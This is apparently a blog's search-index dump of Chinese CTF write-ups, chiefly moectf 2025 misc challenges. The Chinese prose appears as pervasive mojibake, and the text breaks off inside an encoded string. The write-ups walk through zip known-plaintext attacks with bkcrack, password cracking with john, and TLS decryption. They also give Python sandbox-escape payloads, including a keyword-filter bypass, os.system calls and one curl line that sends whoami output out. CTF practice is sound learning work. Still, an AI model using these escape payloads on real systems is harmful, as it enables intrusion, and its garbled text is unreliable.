æ˜¯ns2025ï¼Œè§£å‹å¾—åˆ°ä¸€ä¸ªæ˜æ–‡key.txtå’ŒåŠ å¯†å‹ç¼©åŒ…ï¼ŒåŠ å¯†å‹ç¼©åŒ…æ˜¯ä¸€å±‚ä¼ªåŠ å¯†ï¼Œå¾—åˆ°åŠ å¯†çš„flaaaaggg.txtå’Œkey.txtæ–‡ä»¶ã€‚æˆ‘ä»¬å·²ç»çŸ¥é“key.txtçš„å†…å®¹ï¼Œç›´æ¥æ˜æ–‡æ”»å‡»å°±è¡Œ\nbkcrack -C flag.zip -c key.txt -p key.txt -o 0\n\n\nå¾—åˆ°å¯†é’¥\nc5a43985 0efe59a5 5dfb3167\n\nç„¶åç ´è§£å¯†ç å³å¯\nbkcrack -C flag.zip -c flagggggg.txt -k c5a43985 0efe59a5 5dfb3167 -d decrypted_flag.txt\n\n\nflag&#123;You_have_mastered_the_zip_magic!&#125;\n\nEZ_fenceä¿®æ”¹å®½é«˜ï¼Œå¾—åˆ°æ–°çš„å›¾ç‰‡\n\nOSINT-å¤©ç©ºbelongæ‹æ‘„è®¾å¤‡åœ¨å±æ€§é‡ŒæŸ¥\n\nflag&#123;UQ3574_æ­¦æ±‰å¸‚_Xiaomi&#125;\n\næ˜ŸæœŸå››çš„ç‹‚æƒ³ç¾å¦™çš„éŸ³ä¹æåŠå¤©ï¼ŒåŸæ¥è¿™ä¹ˆç®€å•\n\nå‡ºé¢˜çš„ä½ è‡ªå·±æ¥çœ‹çœ‹èƒ½çœ‹å¾—æ¸…å—\nflag&#123;thi5_1S_m1Di_5tEG0&#125;\n\n##æ—¥å¿—åˆ†æ-ä¸æ•¬è€…çš„é—¯å…¥\næœç´¢200å‘ç°æœ‰ä¸ª/adminè·¯ç”±å¯ä»¥è¿›å»\n\n\nflag&#123;88bb2046-000e-4ed4-b8db-d05b79d53162&#125;\n\nOSINT-å¨èƒæƒ…æŠ¥æŠŠé¢˜ç›®ç»™gptå°±å‡ºäº†ï¼Ÿ\nhttps://any.run/report/2c796053053a571e9f913fd5bae3bb45e27a9f510eace944af4b331e802a4ba0/53de102c-beab-40fd-9a3f-4bcfeda4c7e7\n\nflag&#123;kimsuky_alps.travelmountain.ml_2021-03-31&#125;\n\n","categories":["wp"],"tags":["wp"]},{"title":"moectf 2025wp(å…¨)","url":"/2025/09/09/moectf-wp/","content":"moectfmiscMiscå…¥é—¨æŒ‡åŒ—ä¸‹è½½é™„ä»¶ç›´æ¥æœmoe,æŠŠé‚£ä¸€ä¸²å¤åˆ¶å³å¯\n\nmoectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125;\n\nez_LSBzstegä¸€æŠŠæ¢­\n\nThe flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9&quot;moectf&#123;LSB_1s_s0_1nt3rest1ng!!sj9wd&#125;\n\nsstvæ‰¾ä¸€ä¸ªèƒ½è§£ç sstvçš„å³å¯\n\nmoectf&#123;d3codiNG_SStV_reQu1REs-PATI3nC3&#125;\n\næ‚ä½ä¸€åªè€³ç”¨audacityæ‰“å¼€\n\n.._. ._.. ._ __.  .. ... ___... .... ._  ._.. .._. ..__._  ._. ._ _.. .. ___ ..__._ ..  _. ..__._ _.._  _..  .._\n\n..-. .-.. .- --. .. ... ---... .... .- .-.. ..-. ..--.- .-. .- -.. .. --- ..--.- .. .- ..--.- -..- -.. ..-\n\nè§£ç å¾—åˆ°\nFLAGIS:HALF_RADIO_IN_XDUmoectf&#123;HALF_RADIO_IN_XDU&#125;\n\nEnchantmentwiresharkæ‰“å¼€,å…ˆç”¨http.request.method &#x3D;&#x3D; â€œPOSTâ€æŸ¥çœ‹ä¸Šä¼ æ–‡ä»¶,é€‰ä¸­Portable Network Graphicså¯¼å‡ºåˆ†ç»„å­—èŠ‚æµ\n\né“¶æ²³å­—æ¯è§£å¯†å³å¯\n\ntheflagisbelow nowyouhave mastered enchantingmoectf&#123;now_you_have_mastered_enchanting&#125;\n\nez_pngç”¨binwalkè¿‡ä¸€é,å°±å‡ºæ¥äº†\n\nmoectf&#123;h1DdEn_P4YlOaD_IN-Id4T&#125;\n\nez_é”Ÿæ–¤æ‹·????gbkè½¬utf8å³å¯\nmoectf&#123;EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww&#125;\n\nez_sslå¯¼å‡ºhttpå¯¹è±¡,å‘ç°ä¸Šä¼ äº†ssl.log\n------WebKitFormBoundary1EV4LSnnRBL8OzyBContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ssl.log&quot;Content-Type: application/octet-streamCLIENT_RANDOM 5cc9d58e7bf7268c8c7ca13915b43530206bc57523a3dc06420f47291081bf70 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM 523878d7689e894823485b8f32727c779f8605866423eab6f4cc16c9df1cfb33 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM ccfba4dd12e374afd300f296b691e12b70f9d5f8be0458782887763c8a54626e 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM c8e817f2efcee3be9290aa075919f50f329be997b124487d02a1850e48c4292d 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4------WebKitFormBoundary1EV4LSnnRBL8OzyB--\n\næœ‰äº†è¿™ä¸ªssl.log,æˆ‘ä»¬å°±å¯ä»¥è§£å¯†httpsæµé‡\n\næ‰“å¼€ Wireshark â†’ Edit â†’ Preferences â†’ Protocols â†’ TLS\n\nåœ¨ (Pre)-Master-Secret log filename å¡«å…¥ ssl.log æ–‡ä»¶è·¯å¾„\n\nWireshark å°±èƒ½è‡ªåŠ¨ç”¨é‡Œé¢çš„å¯†é’¥è§£å¯† TLS æµé‡ï¼Œæ˜¾ç¤º HTTP&#x2F;HTTPS æ˜æ–‡\n\n\næµè§ˆæµé‡åŒ…,å‘ç°å­˜åœ¨ä¸Šä¼ æµé‡\n\n\nå¯è§ä¸Šä¼ äº†flag.zip,å¯†ç ä¸ºçº¯7ä½æ•°å­—,å¯¼å‡ºè§£å‹\nzip2john 1.zip &gt; hash.txtjohn --format=zip --mask=?d?d?d?d?d?d?d hash.txt\n\n\n6921682\nookè§£å¯†å³å¯\n\nmoectf&#123;upI0@d-l0G_TO-DeCrYPT_uploAD&#125;\n\nencrypted_pdfä¸‹è½½å¾—åˆ°åŠ å¯†çš„pdf,æ”¾åœ¨ilovepdfé‡Œè§£å¯†\nçŸ¢é‡åŒ–pdf,https://tools.pdf24.org/zh/pdf-to-svg#s=1755503577870\n\nmoectf&#123;Pdf_1s_r3a1ly_c0lor4ul!!ihdw&#125;\n\nä¸‡é‡ŒæŒ‘ä¸€ä¸€ä¸‡ä¸ªå‹ç¼©åŒ…é‡Œæ‰¾åˆ°ä¸€ä¸ªæ­£ç¡®çš„å¯†ç ,è§£å‹lock.zip\nimport pyzipperimport zipfileimport osimport re# è·¯å¾„é…ç½®lock_zip = r&quot;D:\\Problems\\moe\\1\\lock.zip&quot;password_zip = r&quot;D:\\Problems\\moe\\1\\password.zip&quot;extract_root = r&quot;D:\\Problems\\moe\\1\\extracted&quot;lock_extract_dir = r&quot;D:\\Problems\\moe\\1\\unlocked&quot;# æ­£åˆ™åŒ¹é… &quot;The password is:&quot; åé¢çš„å†…å®¹password_pattern = r&#x27;The password is:\\s*(\\S+)&#x27;# å°è¯•ç”¨å¯†ç è§£é” lock.zip ä¸­çš„ flag.zipï¼ˆæ”¯æŒ AES åŠ å¯†ï¼‰def try_unlock_flag_zip(password):    try:        with pyzipper.AESZipFile(lock_zip) as zf:            for name in zf.namelist():                if name.lower().endswith(&#x27;flag.zip&#x27;):                    print(f&quot;å°è¯•è§£é” &#123;name&#125;ï¼Œä½¿ç”¨å¯†ç  &#123;password&#125;&quot;)                    zf.extract(name, path=lock_extract_dir, pwd=password.encode())                    print(f&quot;æˆåŠŸè§£å‹ &#123;name&#125;ï¼å¯†ç : &#123;password&#125;&quot;)                    return True    except Exception as e:        print(f&quot;å¯†ç  &#123;password&#125; è§£é”å¤±è´¥: &#123;e&#125;&quot;)    return False# é€’å½’æå– password.zip ä¸­ pwd.txt å¹¶å°è¯•è§£é” flag.zipdef recursive_extract_password(zip_path, extract_to):    try:        with zipfile.ZipFile(zip_path) as zf:            for name in zf.namelist():                file_path = os.path.join(extract_to, name)                # å¦‚æœæ˜¯ pwd.txt                if name.lower().endswith(&#x27;pwd.txt&#x27;):                    os.makedirs(os.path.dirname(file_path), exist_ok=True)                    zf.extract(name, extract_to)                    with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f:                        content = f.read()                        match = re.search(password_pattern, content)                        if match:                            password = match.group(1)                            print(f&quot;æ‰¾åˆ°å¯†ç : &#123;password&#125;&quot;)                            if try_unlock_flag_zip(password):                                return True                # å¦‚æœæ˜¯ zip æ–‡ä»¶ï¼Œé€’å½’å¤„ç†                elif name.lower().endswith(&#x27;.zip&#x27;):                    os.makedirs(os.path.dirname(file_path), exist_ok=True)                    zf.extract(name, extract_to)                    if recursive_extract_password(file_path, os.path.join(extract_to, os.path.splitext(name)[0])):                        return True    except Exception as e:        print(f&quot;å¤„ç† &#123;zip_path&#125; å‡ºé”™: &#123;e&#125;&quot;)    return False# åˆ›å»ºå¿…è¦ç›®å½•os.makedirs(extract_root, exist_ok=True)os.makedirs(lock_extract_dir, exist_ok=True)# å¼€å§‹é€’å½’æå–å¯†ç å¹¶å°è¯•è§£é” flag.zipsuccess = recursive_extract_password(password_zip, extract_root)if not success:    print(&quot;æœªæ‰¾åˆ°æœ‰æ•ˆå¯†ç ï¼Œflag.zip æœªè§£é”ã€‚&quot;)\n\n\nå¯†ç ä¸ºa296a5ec1385f394e8cb\n\nå·²çŸ¥æ˜æ–‡.exeå’Œflag.txtåŠ å¯†ç±»å‹ä¸ºéƒ½ä¸ºZipCrypto Store,å°è¯•æ˜æ–‡æ”»å‡»,å…ˆæ”»å‡»æ˜æ–‡.exe\né¦–å…ˆå‡†å¤‡æ˜æ–‡æ–‡ä»¶\necho -n &quot;0E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000&quot; | xxd -r -ps &gt; mingwen\n\nè¿›è¡Œæ”»å‡»\nbkcrack -C flag.zip -c æ˜æ–‡.exe -p mingwen -o 102 &gt; 1.log\n\n\nå¾—åˆ°keys\nKeys: eec878a3 6808e48f 3aa41bd8\n\næ”»å‡»flag.txt\nbkcrack -C flag.zip -c flag.txt -k eec878a3 6808e48f 3aa41bd8 -d decrypted_flag.txt\n\n\nmoectf&#123;Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad&#125;\n\nrushè¡¥å…¨å®šä½ç¬¦å³å¯\n\n\nmoectf&#123;QR_C0d3s_feATUR3_eRror_c0RRECt10N&#125;\n\nweird_photoæ”¹å®½å³å¯\n\nmoectf&#123;images/image_Height_Restored&#125;\n\nWebRepoæ‰«ç ,å¾—åˆ°æç¤º\n\nç”¨binwalkæ£€æµ‹å‡º\nâ””â”€# binwalk --run-as=root 1.zip                                              DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------16012         0x3E8C          7-zip archive data, version 0.3\n\nç”¨ä»¥ä¸‹å‘½ä»¤æå–\ndd if=1.zip of=repo.7z bs=1 skip=16012\n\n\nå‘ç°æœ‰flag.txt,ä¸”è¿™ä¸ªæ–‡ä»¶å¤¹å…¶å®å°±æ˜¯.gitæ–‡ä»¶,ç›´æ¥ä»æäº¤é‡Œå¯¼å‡ºflag.txt\ngit log --pretty=oneline -- flag.txt //249ff41401736165cd4514cee7afcd31ecfe7d09git show &lt;æäº¤å“ˆå¸Œ&gt;:flag.txt &gt; flag.txt\n\n\nmoectf&#123;B1NwA1K_ANd_g1t_R3seT-MaG1C&#125;\n\nEncrypted volumeä»é¢˜ç›®å’Œæç¤ºçŒœæµ‹å’Œveracryptæœ‰å…³.å°†é™„ä»¶ç”¨binwalkåˆ†ç¦»å‡ºä¸€å¼ äºŒç»´ç \n\n:@(s&lt;&quot;A3F:89x541Ux[&lt;\n\nç„¶åæœ‰ä¸€ä¸ªvolumeæ–‡ä»¶,æˆ‘ä»¬ç”¨ä¸Šé¢çš„å·¥å…·æŒ‚è½½ä¸‹æ¥\n\nå¾—åˆ°brainfuck.txtï¼Œè§£å¯†å³å¯\n\nmoectf&#123;nOW_YoU-h4V3_UNlocKED-VOlumE&#125;\n\npyjail0nc 192.168.243.1 54227\n\nç„¶åæŒ‰ç…§è¦æ±‚å³å¯,flagåœ¨&#x2F;proc&#x2F;self&#x2F;environ\n\nmoectf&#123;a8b61373-b10d-c71a-b109-041b45320746&#125;\n\nPyjail 1def chall():    user_input = input(&quot;Give me your code: &quot;)    # è¿‡æ»¤å…³é”®å­—    forbidden_keywords = [&#x27;import&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;open&#x27;, &#x27;file&#x27;]    for keyword in forbidden_keywords:        if keyword in user_input:            print(f&quot;Forbidden keyword detected: &#123;keyword&#125;&quot;)            return        result = eval(user_input)\n\néœ€è¦è¿›è¡Œæ²™ç®±é€ƒé€¸å‚è€ƒæ–‡æ¡£:https://www.cnblogs.com/N1ng/p/18491520\nå°è¯•ç”¨help()æ— æ³•ç»•è¿‡\né»‘åå•å¯ä»¥ç”¨unicodeç¼–ç ç»•è¿‡,ç½‘ä¸Šæ‰¾çš„è„šæœ¬å¦‚ä¸‹\nfrom unicodedata import normalizefrom string import ascii_lowercasefrom collections import defaultdictlst = list(ascii_lowercase)dic = defaultdict(list)for char in lst:    for i in range(0x110000):        if normalize(&quot;NFKC&quot;, chr(i)) == char:            dic[char].append(chr(i))        if len(dic[char]) &gt; 9:            breakprint(dic)\n\nå¾—åˆ°\nğ“®val(inpğ“¾t())\n\nè¾“å…¥ä¹‹åè¿›å…¥äº¤äº’çŠ¶æ€,ä¹‹åå³å¯é€ƒé€¸\n__import__(&#x27;os&#x27;).system(&#x27;cat /tmp/f*&#x27;)\n\n\n\n\nmoectf&#123;1abe3a6d-4e4e-2cf4-7b0a-4ccfd7cb8a6b&#125;\n\nğ“®val(inpğ“¾t())__import__(&#x27;os&#x27;).system(&#x27;cat /tmp/f*&#x27;)\n\n\n\nPyjail 2def chall():    user_input = input(&quot;Give me your code: &quot;)    # è¿‡æ»¤å…³é”®å­—    forbidden_keywords = [&#x27;import&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;open&#x27;, &#x27;file&#x27;]    for keyword in forbidden_keywords:        if keyword in user_input:            print(f&quot;Forbidden keyword detected: &#123;keyword&#125;&quot;)            return        # è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦    forbidden_chars = [&#x27;.&#x27;, &#x27;_&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &quot;&#x27;&quot;, &#x27;&quot;&#x27;]    for char in forbidden_chars:        if char in user_input:            print(f&quot;Forbidden character detected: &#123;char&#125;&quot;)            return    result = eval(user_input)\n\næœ¬åœ°æµ‹è¯•å‘ç°ä¸Šä¸€é¢˜çš„payloadå¯ä»¥ç»§ç»­æ‰“\n\nmoectf&#123;74642fb3-4cea-91a2-ffb3-50f2c35302b6&#125;\n\npyjail 3def chall():    user_input = input(&quot;Give me your code: &quot;)            try:        result = eval(user_input, &#123;&quot;__builtins__&quot;: None&#125;, &#123;&#125;)        # Hint: When __builtins__ is None, you need to be more creative...        print(&quot;Code executed successfully!&quot;)        if result is not None:            print(f&quot;Return value: &#123;result&#125;&quot;)    except Exception as e:        print(f&quot;Execution error: &#123;type(e).__name__&#125;: &#123;e&#125;&quot;)        \n\nè¿™é‡Œç›´æ¥æ¸…ç©ºäº†æ‰€æœ‰builtinsé‡Œçš„å‡½æ•°\n# os[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;cat /tmp/f*&quot;)# subprocess [ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;Popen&#x27;][0](&#x27;ls&#x27;)# builtins[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]# help[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#x27;help&#x27;][ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#x27;__builtins__&#x27;]#sys[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)#commands (not very common)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)#pty (not very common)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)#importlib[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)#imp[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)#pdb[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)# ctypes[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())# multiprocessing[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()\n\nè¿™æ˜¯æˆ‘ä»https://blog.lightwing.top/2025/01/12/python_jail_escape/#%E4%B8%8A%E8%BF%B0%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87%E6%A3%80%E6%9F%A5%E6%96%B9%E5%BC%8Fæ‰¾åˆ°çš„ä¸€äº›é€šè¿‡ç»§æ‰¿é“¾çš„æ–¹å¼è¿›è¡Œé€ƒé€¸çš„payload,ä»¥ç¬¬ä¸€æ¡ä¸ºä¾‹è§£é‡Š\nåˆ†æ­¥æ‹†è§£:\n\n&#39;&#39;.__class__\nç©ºå­—ç¬¦ä¸² &#39;&#39; çš„ç±»å°±æ˜¯ strã€‚\næ‰€ä»¥ &#39;&#39;.__class__ == strã€‚\n\n\n.__base__\nstr ç»§æ‰¿è‡ª objectã€‚\næ‰€ä»¥ &#39;&#39;.__class__.__base__ == objectã€‚\n\n\n.__subclasses__()\nobject.__subclasses__() ä¼šè¿”å›å½“å‰æ‰€æœ‰ object çš„å­ç±»ï¼Œä¹Ÿå°±æ˜¯ Python è¿è¡Œç¯å¢ƒä¸­åŠ è½½çš„æ‰€æœ‰ç±»å¯¹è±¡ã€‚\nè¿™åŒ…å«äº†å¾ˆå¤šæ ‡å‡†åº“çš„ç±»ï¼Œæ¯”å¦‚ type, tuple, list, _wrap_close ç­‰ã€‚\n\n\nif x.__name__==&quot;_wrap_close&quot;\néå† object.__subclasses__() è¿”å›çš„æ‰€æœ‰ç±»ï¼Œç­›é€‰å‡ºåå­—å« &quot;_wrap_close&quot; çš„ç±»ã€‚\n_wrap_close æ˜¯ Python åœ¨å¤„ç† I&#x2F;O æ—¶ç”¨çš„ä¸€ä¸ªå†…éƒ¨ç±»ã€‚\n\n\nx.__init__.__globals__\nå– _wrap_close ç±»çš„ __init__ æ–¹æ³•ã€‚\næ¯ä¸ªå‡½æ•°å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª __globals__ å±æ€§ï¼ŒæŒ‡å‘å®šä¹‰å®ƒæ—¶æ‰€åœ¨çš„å…¨å±€å˜é‡å­—å…¸ï¼ˆä¹Ÿå°±æ˜¯ä¸€æ•´ä¸ª Python å…¨å±€å‘½åç©ºé—´ï¼‰ã€‚\nåœ¨è¿™ä¸ªå­—å…¸é‡Œï¼Œå¯ä»¥æ‰¾åˆ°å†…ç½®å‡½æ•°ã€æ¨¡å—ç­‰ï¼ŒåŒ…æ‹¬ systemã€‚\n\n\n[ ... ][0]\nå‰é¢ç”¨åˆ—è¡¨æ¨å¯¼å¼æ‰¾åˆ°äº†ç›®æ ‡ç±»ï¼ŒæŠŠå®ƒä»¬çš„ __globals__ æ”¶é›†åˆ°åˆ—è¡¨ä¸­ã€‚\nå–ç¬¬ä¸€ä¸ª [0]ã€‚\n\n\n[&quot;system&quot;]\nä»å…¨å±€å­—å…¸é‡Œæ‹¿åˆ°é”® &quot;system&quot; å¯¹åº”çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ os.systemã€‚\n\n\n(&quot;cat /tmp/f\\*&quot;)\nè°ƒç”¨ os.system(&quot;cat /tmp/f*&quot;)ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒæŠŠ /tmp ç›®å½•ä¸‹ä»¥ f å¼€å¤´çš„æ–‡ä»¶æ‰“å°å‡ºæ¥ã€‚\n\n\n\n\nmoectf&#123;4ef3e96b-f34a-0bc3-5174-8e702603a155&#125;\n\nå“ˆåŸºç±³è¯­å—åŒ—ç»¿è±†å¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼›æ¬§è«å­£é‡Œå™¶å¥ˆå“ªä¹°å™¶å¥ˆå“¦å—å‰åˆ©ã€‚å“¦å—å‰åˆ©å“ªä¹°å™¶å¥ˆå“ªæ¤°å¥¶é¾™ï¼Ÿå“ˆåŸºç±³ä¹°å¨œå¥ˆå“ªä¹°åŒ—çªé‚£æ²¡æ’¸å¤šã€‚å“ˆåŸºç±³å¤šå¤šå‹é‚£å¥ˆæ¤°å¥¶é¾™ï¼›å¥ˆè¯ºå¨œç¾å˜å“ªä¹°å¨œå¥ˆå“ªä¹°çªé‚£æ²¡æ’¸å¤šï¼Ÿå“¦å—å‰åˆ©å™¶å¥ˆå“ªä¹°å“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå™¶å¥ˆå“ªä¹°å™¶å¥ˆå“ªå“ˆåŸºç±³ã€‚åº“è·¯æ›¼æ³¢ä¹°å™¶å¥ˆå“ªä¹°å“¦å—å‰åˆ©ï¼Œå“ˆåŸºç±³å¨œå¥ˆå“ªä¹°åŒ—å—åŒ—ç»¿è±†ï¼Œå“¦å—å‰åˆ©å¤šå¤šå‹é‚£å¤šå¤šæ¬§è«å­£é‡Œã€‚é˜¿è¥¿å™¶å‹å‹é‚£å—æ’¸åŸºé˜¿å¥ˆè¯ºå¨œç¾å˜ï¼Œå“ˆåŸºç±³å—é‡Œå—åŒ—å‹é‡Œçªé‚£æ²¡æ’¸å¤šã€‚åº“è·¯æ›¼æ³¢ä¸€å‰è±†æ²¡å’•æ¤°å¥¶é¾™ï¼Œåº“è·¯æ›¼æ³¢å‰è±†æ²¡å’•å‰è±†æ¤°å¥¶é¾™ã€‚åº“è·¯æ›¼æ³¢æ²¡å’•å‰è±†æ²¡å’•åº“è·¯æ›¼æ³¢ï¼Ÿå“¦å—å‰åˆ©å‰è±†æ²¡ç±³å‰åº“è·¯æ›¼æ³¢ã€‚é˜¿è¥¿å™¶å‹è±†è€¶å’•å‰è±†æ²¡ç±³çªé‚£æ²¡æ’¸å¤šï¼›å—åŒ—ç»¿è±†å‰è±†æ²¡ç±³å“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå‰è±†æ²¡å’•å‰å¥ˆè¯ºå¨œç¾å˜ã€‚åº“è·¯æ›¼æ³¢è±†æ²¡å’•å‰è±†æ¤°å¥¶é¾™ï¼Œæ¬§è«å­£é‡Œæ²¡å’•å‰è±†æ²¡å’•å‰å—åŒ—ç»¿è±†ï¼Ÿåº“è·¯æ›¼æ³¢è±†æ²¡ç±³å‰è±†æ¬§è«å­£é‡Œã€‚å“¦å—å‰åˆ©è€¶å’•å‰è±†æ²¡å’•å¥¶å“ˆåŸºç±³ï¼›çªé‚£æ²¡æ’¸å¤šå‹å¤šé‚£å‰è±†æ²¡å’•å¥ˆè¯ºå¨œç¾å˜ã€‚é˜¿è¥¿å™¶å‹å‰è±†æ²¡å’•å‰å“¦å—å‰åˆ©ï¼›æ¤°å¥¶é¾™è±†æ²¡å’•å‰è±†æ²¡å’•å—åŒ—ç»¿è±†ã€‚çªé‚£æ²¡æ’¸å¤šå‰è±†æ²¡ç±³å¥¶å‹å“ˆåŸºç±³ï¼Œå“ˆåŸºç±³å¤šé‚£å‰è±†æ²¡ç±³å‰å“ˆåŸºç±³ï¼Ÿå¥ˆè¯ºå¨œç¾å˜è±†æ²¡å’•å‰è±†çªé‚£æ²¡æ’¸å¤šï¼Œå—åŒ—ç»¿è±†æ²¡å’•å‰è±†æ²¡å’•å‰çªé‚£æ²¡æ’¸å¤šï¼Œçªé‚£æ²¡æ’¸å¤šè±†æ²¡å’•å‰å“¦å—å‰åˆ©ï¼›å—åŒ—ç»¿è±†è±†æ²¡å’•å‰è±†æ²¡ç±³çªé‚£æ²¡æ’¸å¤šï¼›å—åŒ—ç»¿è±†å‰è±†è€¶å’•å‰è±†æ¤°å¥¶é¾™ã€‚å“ˆåŸºç±³æ²¡ç±³å‰è±†å“ˆåŸºç±³ï¼Ÿåº“è·¯æ›¼æ³¢è€¶å—å¤šå¥ˆå“ªä¹°å™¶å“ˆåŸºç±³ã€‚å“¦å—å‰åˆ©å¥ˆå“ªä¹°å™¶å¥ˆå“ªé˜¿è¥¿å™¶å‹ï¼›å—åŒ—ç»¿è±†ä¹°å™¶å¥ˆå“ªçªé‚£æ²¡æ’¸å¤šï¼›é˜¿è¥¿å™¶å‹ä¹°å™¶å¥ˆå“ªä¹°é˜¿è¥¿å™¶å‹ï¼›å“ˆåŸºç±³å¨œå¤šå¤šå‹é‚£çªé‚£æ²¡æ’¸å¤šï¼Ÿæ¬§è«å­£é‡Œå¥ˆå“ªä¹°åŒ—å¤šå¥ˆè¯ºå¨œç¾å˜ï¼›å“¦å—å‰åˆ©å¤šå‹é‚£å‘€é‡Œæ¬§è¥¿åº“è·¯æ›¼æ³¢ã€‚çªé‚£æ²¡æ’¸å¤šå¥ˆå“ªä¹°å™¶å¥ˆå“ˆåŸºç±³ï¼›å—åŒ—ç»¿è±†å“ªä¹°å™¶å¥ˆå“ªå“¦å—å‰åˆ©ï¼Œæ¬§è«å­£é‡Œä¹°å™¶å¥ˆå“ªä¹°å™¶å¥ˆåº“è·¯æ›¼æ³¢ï¼Œåº“è·¯æ›¼æ³¢å“ªä¹°å™¶å¤šå¤šå‹é‚£åº“è·¯æ›¼æ³¢ã€‚å“ˆåŸºç±³å¥ˆå“ªä¹°å™¶å¥ˆå“ªä¹°å—åŒ—ç»¿è±†ï¼Ÿæ¤°å¥¶é¾™å¨œå¥ˆå“ªä¹°å“ˆåŸºç±³ï¼Œçªé‚£æ²¡æ’¸å¤šå™¶å¥ˆå“ªä¹°å¥ˆè¯ºå¨œç¾å˜ï¼Ÿé˜¿è¥¿å™¶å‹å™¶å¥ˆå“ªä¹°å™¶å¥ˆå“ªå“ˆåŸºç±³ï¼Œé˜¿è¥¿å™¶å‹ä¹°å™¶å¥ˆå“ªä¹°å¨œå¥ˆå¥ˆè¯ºå¨œç¾å˜ã€‚å¥ˆè¯ºå¨œç¾å˜å“ªä¹°åŒ—å¥ˆå“ªä¹°å